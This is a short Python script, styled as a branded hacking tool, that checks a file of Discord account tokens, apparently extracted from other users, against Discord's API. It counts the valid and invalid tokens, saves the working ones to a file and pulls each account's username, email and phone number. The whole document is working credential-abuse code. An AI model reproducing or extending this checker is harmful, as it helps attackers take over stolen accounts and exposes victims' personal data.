import requests,json,time
from os import system
from art import *
from colorama import Fore, Back, Style

class dd:
    system('mode con: cols=64 lines=11')

    print(Fore.RED + text2art('''\n                    ZVHK''', font="small"))

    iii = input("[!] - Press Enter To Start > ")

    system('cls')

    print(Fore.RED + text2art('''\n                    ZVHK''', font="small"))

    def __init__(self):

        self.request = requests.Session()
        self.count = 0
        self.vtoken = 0
        self.uvtoken = 0
        self.all = 0
        
        with open('Tokens Extracted.txt','r') as qq:
            self.token = qq.read().splitlines()
            self.lenc = len(self.token)

        for self.i in self.token:
            self.tokeninfo()         


    def tokeninfo(self):

        try:

            self.headers = {
            'Authorization': self.i,
            'Content-Type': 'application/json',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/0.0.305 Chrome/69.0.3497.128 Electron/4.0.8 Safari/537.36'
            
            }

            r = self.request.get('https://canary.discordapp.com/api/v6/users/@me', headers=self.headers, timeout=10)
            response = json.loads(r.content)

            if r.status_code == 403:
                self.uvtoken+=1
                self.all+=1
            elif r.status_code == 401:
                self.uvtoken+=1
                self.all+=1

            else:
                self.vtoken+=1
                self.all+=1
                #print("   Token is Valid : ",self.i )
                ik = f"\n   Name: {response['username']}#{response['discriminator']}   ID: {response['id']}\n   Email: {response['email']}   Phone: {response['phone']}\n   Language: {response['locale']}\n"
                #print(ik)
                f = open("Valid Tokens.txt", "a")
                f.write(f"'{self.i}',\n") 

            self.uu = self.lenc - self.all

            system(f"title Token Remain : {self.uu}")

            print(f"[!] - Tokens Valid : {self.vtoken} | Tokens Invalid : {self.uvtoken}" ,end="\r")

                
        except:
            pass


dd()

time.sleep(0.7)

print("\n[!] - Done !")

time.sleep(0.5)

a = input('[!] - Press Enter to Exit > ')
if a:
    exit(0)







